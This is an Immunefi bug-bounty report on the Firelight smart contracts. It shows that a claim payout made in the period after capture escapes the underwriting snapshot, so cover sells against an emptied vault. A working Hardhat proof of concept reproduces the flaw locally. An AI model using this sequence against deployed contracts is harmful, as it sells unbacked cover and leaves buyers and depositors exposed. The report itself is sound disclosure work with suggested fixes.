# 89090 sc high a period c payout executed during c 1 is invisible to coverorderallocator s period start capacity snapshot letting a full book of c 1 cover be sold and settled against a vault the&#x20;

**Submitted on Aug 17th 2026 at 04:43:36 UTC by @zhouchungong for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89090
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/CoverOrderAllocator.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

`_computeAvailableCapacity` sizes a period's cover ceiling from `vault.totalAssetsAt(vault.currentPeriodStart())`. A claim captured in period C stays payable through C+1, and `payout()` checkpoints when it executes, so C's payout — made during C+1 — lands outside the snapshot C+1 reads. The payout empties the vault first; the ceiling never sees it, and a full book of C+1 cover is then sold and settled against nothing.

## Vulnerability Details

The ceiling reads a period-start snapshot:

```solidity
// CoverOrderAllocator.sol#L710-711
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
```

and `_validateMatchingCapacity` is the only on-chain bound that ties a period's cover to vault assets:

```solidity
// CoverOrderAllocator.sol#L400-401
uint256 maxCapacity = _computeAvailableCapacity($, period);
if (matchingCapacity > maxCapacity) revert MatchingCapacityOverflow(matchingCapacity, maxCapacity);
```

`totalAssetsAt(t)` returns the last checkpoint with key at or before `t` (`FirelightVault.sol#L456-458`, `core/lib/Checkpoints.sol#L218-221`), while `payout()` checkpoints at the current time:

```solidity
// FirelightVault.sol#L952
_traceTotalAssets.push(Time.timestamp(), currentActiveAssets - paidFromActive);
```

For any payout strictly after a period's start, that checkpoint lies outside the snapshot the ceiling reads, and stays outside for the rest of the period.

Paying a claim a period after its capture is specified, not incidental: `_isPeriodInPayoutWindow` is `current == period || current == period + 1` (`FirelightVault.sol#L1130-1132`), and `IncidentManager._isPeriodExpired` is its negation (`IncidentManager.sol#L839-841`). The code prioritises it:

> …Unresolved incidents from the previous period take priority over the current period; within a period the earliest capture timestamp wins. (`IncidentManager.sol#L869-870`)

Underwriting never reads incident state: `grep -c -i incident contracts/core/CoverOrderAllocator.sol` returns 1, a comment on line 26.

`_computeAvailableCapacity` reads the first-loss buffer live (`CoverOrderAllocator.sol#L705`), so buffer outflows correct the ceiling at once. Only the staked leg is frozen.

The protocol knows about this exposure and guards it — but only where money comes in:

> …The previous period is included because a claim captured then is still payable this period, so deposits stay blocked until that payout window closes; otherwise fresh deposits would back unresolved exposure. (`FirelightVault.sol#L1112-1114`)

`deposit` and `mint` enforce that at `#L660` and `#L696` — but only while an incident is open: the flag clears with the incident, not with the window. Underwriting has no counterpart at all.

## Impact Details

Real `FirelightVault`, `CoverOrderAllocator`, `IncidentManager`; `minCAR = effectiveLeverage = 12000` (multiplier exactly 1.0x, so there is no leverage to attribute this to), tolerance 0, empty buffer.

| vault assets unless marked                |        approval inside C (control) | approval deferred to C+1 |
| ----------------------------------------- | ---------------------------------: | -----------------------: |
| C's payout, executed by `IncidentManager` |                             20,000 |                   20,000 |
| `totalAssets()` after it                  |                                  0 |                        0 |
| `totalAssetsAt(startOf(C+1))`             |                                  0 |                   20,000 |
| ceiling for C+1                           |                                  0 |                   20,000 |
| commit of the full ceiling                | reverts `MatchingCapacityOverflow` |                 accepted |
| cover sold and settled for C+1            |                                  — |         20,000 canonical |

The only variable moved is when the assessment is approved, and the contract never treats that timing as a control: underwriting reads neither incident state nor live assets. Settlement still pulls the buyer's premium — 19.178083 USDC here — and mints the CoverNFT (`CoverOrderAllocator.sol#L535`, `#L537`). That premium is all that changes hands at once; the damage is 20,000 canonical of cover with nothing behind it. Obligations exceed assets from settlement onward: that is the insolvency.

Exposure is not limited to that buyer. `payout` bounds a C+1 claim by the lesser of live payable assets and `totalAssetsAt(startOf(C+1))` (`FirelightVault.sol#L911`, `#L927`) — the same spent snapshot, so it stops binding — and the payout closed the incident, reopening the deposit gate (`IncidentManager.sol#L436`, `#L829`). In the run a newcomer deposits 20,000 and all of it is payable against cover sized on money already gone. The pattern recurs whenever a payout is deferred.

**Why this is in scope.** The run bypasses an intended protocol constraint rather than requiring any role to exceed its authority: `_validateMatchingCapacity` is that constraint, and the control shows the same action rejected when the approval lands one period earlier. No role acts incorrectly either — approving in C+1 is inside the window the contract defines. Prices are constant throughout, so this is not the disclosed collateral-drawdown case; and the known issue concerns aggregate *claims* outrunning cover sold, where here one legitimate claim is paid and cover outruns assets.

**Limitations.** The first-loss buffer absorbs the loss first (`IncidentManager.sol#L645-670`), so this needs an assessed loss larger than the deployed buffer, whose size I have not measured. An off-chain matcher could decline on live assets, though not on incident state: the payout closed the incident before this sale. The program casts that matcher as computing and submitting allocation commitments, not as a collateral check, and nothing on chain requires it.

**Suggested fix.** The two obvious guards are complementary, not alternatives; I implemented and ran both. `Math.min(totalAssetsAt(currentPeriodStart()), totalAssets())` rejects this sale without blocking ordinary underwriting, but not a commit placed *before* the payout, because `_settleCoverOrder` reuses the stored `commit.totalAvailableCapacity` (`CoverOrderAllocator.sol#L507`). Mirroring `hasActiveIncident` fails the other way round: it catches that earlier commit, but by this sale the flag is already false. Re-checking capacity at settlement would cover both; I did not implement that one.

## Proof of Concept

```bash
git clone https://github.com/immunefi-team/audit-comp-firelight && cd audit-comp-firelight
git checkout v1_audit_ready
npm install
mkdir -p test/poc   # put the file below there
npx hardhat test test/poc/SUBMIT-cross-period.js
```

No fork, no RPC. Both cases share one `setup()`; the only variable moved is where `approve(s)` runs.

| Test                               | Asserts                                                                                                                            | Observed                                                                                                                                             |
| ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| control — approval inside C        | the claim is paid in full, the C+1 snapshot is 0, and the full-ceiling commit reverts                                              | 20,000 paid, snapshot 0, contract-computed ceiling 0, reverted                                                                                       |
| finding — approval deferred to C+1 | the payout empties the vault, snapshot and ceiling unchanged, the full ceiling settles, premium taken, later deposit fully payable | 20,000 paid, `totalAssets()` 0, snapshot 20,000, ceiling 20,000, 20,000 canonical settled, 19.178083 USDC collected, newcomer's 20,000 fully payable |

`ceilingOf()` reads the ceiling out of the contract: it staticCalls `commitAllocation` with `MaxUint256` and takes `maxCapacity` from the resulting `MatchingCapacityOverflow`, rejecting any other error. In the control's `withArgs` the second argument is that ceiling; the first is ours, echoed back.

```
  Firelight: a period-C payout executed in C+1 leaves C+1 underwriting against spent assets
  CONTROL  C's payout executed in C    = 20000.0
  CONTROL  totalAssets() now           = 0.0
  CONTROL  totalAssetsAt(startOf(C+1)) = 0.0   ceiling = 0.0
  CONTROL  commit of 20000.0 for C+1 rejected: MatchingCapacityOverflow
    ✔ CONTROL: approving inside C reduces the C+1 snapshot and the commit is rejected (2873ms)
  FINDING  C's payout executed in C+1  = 20000.0
  FINDING  totalAssets() now           = 0.0
  FINDING  totalAssetsAt(startOf(C+1)) = 20000.0   ceiling = 20000.0
  FINDING  cover sold and settled for C+1 = 20000.0 canonical, on an empty vault
  FINDING  premium taken from the C+1 buyer = 19.178083 USDC
  FINDING  payable to a C+1 claim, vault empty = 0.0
  FINDING  newcomer deposits 20000.0 -> payable to a C+1 claim = 20000.0
    ✔ FINDING: deferring the same approval to C+1 sells the full ceiling out of an emptied vault (860ms)


  2 passing (4s)
```

```javascript
// Firelight — a period-C payout executed during C+1 is invisible to C+1's underwriting ceiling.
//
// Real FirelightVault, CoverOrderAllocator and IncidentManager; payout driven by
// approveCurrentAssessment; minCAR = effectiveLeverage = 12000, tolerance 0 (multiplier
// exactly 1.0x), empty first-loss buffer. The cases differ only in WHERE approve(s) runs.
// No state-changing call to vault.payout() appears here; both uses are staticCall probes.

const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('../setup/fixtures.js')
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')

const S = 20_000n * 10n ** 6n            // staked assets
const CAP = S * 10n ** 12n               // 1.0x multiplier => ceiling == staked USD
const A_SHARE = CAP * 6000n / 10000n     // Morpho / Aave concentration caps
const B_SHARE = CAP * 4000n / 10000n
const WEEK = 604800
const f6 = (x) => ethers.formatUnits(x, 6)
const f18 = (x) => ethers.formatUnits(x, 18)

const signer = async () => {
  const w = ethers.Wallet.createRandom().connect(ethers.provider)
  await ethers.provider.send('hardhat_setBalance', [w.address, '0x3635C9ADC5DEA00000'])
  return w
}

describe('Firelight: a period-C payout executed in C+1 leaves C+1 underwriting against spent assets', function () {
  const setup = async () => {
    const v = await loadFixture(deployVault)
    const vault = v.firelight_vault
    const [dep] = await ethers.getSigners()
    const [admin, curator, allocRole, cfg, approver, flb] =
      await Promise.all([signer(), signer(), signer(), signer(), signer(), signer()])

    const usdc = await (await ethers.getContractFactory('MockERC20')).connect(dep).deploy('USDC', 'USDC', 6)
    const feed = await (await ethers.getContractFactory('MockAggregatorV3')).connect(dep).deploy(18, 10n ** 18n)
    const nft = await upgrades.deployProxy(await ethers.getContractFactory('CoverNFT'),
      ['C', 'C', '', admin.address, dep.address, ethers.ZeroAddress, ethers.ZeroAddress], { kind: 'transparent' })

    const enc = ethers.AbiCoder.defaultAbiCoder()
    const nA = ethers.encodeBytes32String('market-A'), nB = ethers.encodeBytes32String('market-B')
    const mkt = (c, p, n) => ethers.keccak256(enc.encode(['uint64', 'string', 'bytes32'], [c, p, n]))
    const A = mkt(1, 'Morpho', nA), B = mkt(10, 'Aave', nB)

    const alloc = await upgrades.deployProxy(await ethers.getContractFactory('CoverOrderAllocator'), [{
      vault: await vault.getAddress(), premiumCollector: admin.address, coverNFT: await nft.getAddress(),
      priceFeedAdapter: await feed.getAddress(), maxPriceAge: 7 * 24 * 3600,
      premiumTokens: [await usdc.getAddress()], admin: admin.address, adminRole: admin.address,
      curatorRole: curator.address, allocatorRole: allocRole.address, configAdminRole: cfg.address,
      initialProtocolConcentrations: [
        { protocol: 'Morpho', chainId: 1, maxProtocolConcentrationBps: 6000 },
        { protocol: 'Aave', chainId: 10, maxProtocolConcentrationBps: 4000 }],
      newMarkets: [{ chainId: 1, protocol: 'Morpho', market: nA },
        { chainId: 10, protocol: 'Aave', market: nB }],
      capacityConfig: {
        minCAR: 12000, firstLossBufferToken: await usdc.getAddress(), firstLossBuffer: flb.address,
        effectiveLeverage: 12000, minOrderMarketCoverAmount: 1, divergenceToleranceBps: 0
      }
    }], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
    await nft.connect(admin).grantRole(ethers.id('MINTER_ROLE'), await alloc.getAddress())

    const im = await upgrades.deployProxy(await ethers.getContractFactory('IncidentManager'), [
      admin.address, curator.address, approver.address, admin.address, admin.address,
      admin.address, admin.address, admin.address, v.payout_receiver.address,
      await alloc.getAddress(), await feed.getAddress(), 7 * 24 * 3600
    ], { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] })
    await vault.connect(dep).grantRole(await vault.PAYOUT_ROLE(), await im.getAddress())
    await vault.connect(dep).grantRole(await vault.INCIDENT_ROLE(), await im.getAddress())

    const split = [{ m: A, c: A_SHARE }, { m: B, c: B_SHARE }]
    const order = async (buyer) => {
      await usdc.mint(buyer.address, 10n ** 11n)
      await usdc.connect(buyer).approve(await alloc.getAddress(), ethers.MaxUint256)
      await alloc.connect(curator).createCoverOrder(buyer.address, buyer.address, buyer.address,
        await usdc.getAddress(),
        split.map(a => ({ marketId: a.m, coverRateAnnual: 500, coverAmount: a.c })), 0)
    }
    const sell = async (period, id) => {
      const t = StandardMerkleTree.of([[BigInt(id), split.map(a => [a.m, a.c])]],
        ['uint256', '(bytes32,uint256)[]'])
      await alloc.connect(allocRole).commitAllocation(period, t.root, CAP, CAP)
      await alloc.connect(allocRole).settleCoverOrder(id,
        split.map(a => ({ marketId: a.m, allocatedCover: a.c })), t.getProof(0))
    }
    const roll = async () => { await time.increase(WEEK); await feed.setAnswer(10n ** 18n) }

    // C-1: fund the vault, create C's claimant order.
    await v.utils.mintAndApprove(S, v.users[0])
    await vault.connect(v.users[0]).deposit(S, v.users[0].address)
    await roll()
    await order(v.users[1])

    // C: settle it, create the C+1 order.
    await roll(); await time.increase(7200)
    const C = await vault.currentPeriod()
    await sell(C, 0)
    await order(v.users[2])

    // C: open and submit an incident.
    const ts = (await vault.currentPeriodStart()) + 60n
    await im.connect(curator).createIncident(ts, 'incident', ethers.id('ref'))
    await im.connect(curator).confirmIncident(1, 'ipfs://report')
    await im.connect(curator).addAssessmentLosses(1, [{ coverTokenId: 0, marketId: A, amount: A_SHARE },
      { coverTokenId: 0, marketId: B, amount: B_SHARE }])
    await im.connect(curator).submitCurrentAssessment(1)

    return { vault, alloc, im, approver, allocRole, C, roll, sell, v, usdc, admin }
  }

  const approve = (s) => s.im.connect(s.approver).approveCurrentAssessment(1)

  const ceilingOf = async (s) => {
    try {
      await s.alloc.connect(s.allocRole).commitAllocation
        .staticCall(await s.vault.currentPeriod(), ethers.id('probe'), 0, ethers.MaxUint256)
    } catch (e) {
      const p = s.alloc.interface.parseError(e.data ?? e.error?.data)
      if (p?.name !== 'MatchingCapacityOverflow') throw new Error('probe: ' + p?.name)
      return p.args[1]
    }
    throw new Error('probe did not revert')
  }

  it('CONTROL: approving inside C reduces the C+1 snapshot and the commit is rejected', async () => {
    const s = await setup()
    await approve(s)                                   // <-- inside C
    const [cInc] = await s.im.getIncident(1)
    console.log(`  CONTROL  C's payout executed in C    = ${f6(cInc.vaultPaidAmount)}`)
    console.log(`  CONTROL  totalAssets() now           = ${f6(await s.vault.totalAssets())}`)
    expect(cInc.vaultPaidAmount).to.equal(S)           // same claim, paid in full, as in FINDING
    expect(await s.vault.totalAssets()).to.equal(0n)
    await s.roll()

    const snap = await s.vault.totalAssetsAt(await s.vault.currentPeriodStart())
    console.log(`  CONTROL  totalAssetsAt(startOf(C+1)) = ${f6(snap)}   ceiling = ${f18(await ceilingOf(s))}`)
    expect(snap).to.equal(0n)

    await expect(s.alloc.connect(s.allocRole).commitAllocation(s.C + 1n, ethers.id('r'), 0, CAP))
      .to.be.revertedWithCustomError(s.alloc, 'MatchingCapacityOverflow').withArgs(CAP, 0n)
    console.log(`  CONTROL  commit of ${f18(CAP)} for C+1 rejected: MatchingCapacityOverflow`)
  })

  it('FINDING: deferring the same approval to C+1 sells the full ceiling out of an emptied vault', async () => {
    const s = await setup()
    await s.roll()
    await approve(s)                                   // <-- inside C+1, BEFORE any C+1 cover is sold

    const start = await s.vault.currentPeriodStart()
    const [inc] = await s.im.getIncident(1)
    const live = await s.vault.totalAssets()
    const snap = await s.vault.totalAssetsAt(start)
    console.log(`  FINDING  C's payout executed in C+1  = ${f6(inc.vaultPaidAmount)}`)
    console.log(`  FINDING  totalAssets() now           = ${f6(live)}`)
    const ceiling = await ceilingOf(s)
    console.log(`  FINDING  totalAssetsAt(startOf(C+1)) = ${f6(snap)}   ceiling = ${f18(ceiling)}`)
    expect(inc.vaultPaidAmount).to.equal(S)
    expect(live).to.equal(0n)
    expect(snap).to.equal(S)
    expect(ceiling).to.equal(CAP)                      // the contract's own number, not inferred from sell()

    const collectedBefore = await s.usdc.balanceOf(s.admin.address)
    await s.sell(s.C + 1n, 1)
    const premium = (await s.usdc.balanceOf(s.admin.address)) - collectedBefore
    const payable = await s.vault.connect(s.v.payout_signer).payout
      .staticCall(s.v.payout_receiver.address, ethers.MaxUint256, start + 60n)

    console.log(`  FINDING  cover sold and settled for C+1 = ${f18(CAP)} canonical, on an empty vault`)
    console.log(`  FINDING  premium taken from the C+1 buyer = ${f6(premium)} USDC`)
    console.log(`  FINDING  payable to a C+1 claim, vault empty = ${f6(payable)}`)
    expect(await s.vault.totalAssets()).to.equal(0n)
    expect(premium).to.be.greaterThan(0n)              // value really changed hands
    expect(payable).to.equal(0n)

    // The payout closed the incident, so deposits reopen; the C+1 cap reads the same snapshot.
    const newcomer = await signer()
    await s.v.utils.mintAndApprove(S, newcomer)
    await s.vault.connect(newcomer).deposit(S, newcomer.address)
    const payableNow = await s.vault.connect(s.v.payout_signer).payout
      .staticCall(s.v.payout_receiver.address, ethers.MaxUint256, start + 60n)
    console.log(`  FINDING  newcomer deposits ${f6(S)} -> payable to a C+1 claim = ${f6(payableNow)}`)
    expect(payableNow).to.equal(S)                     // all of it
  })
})
```
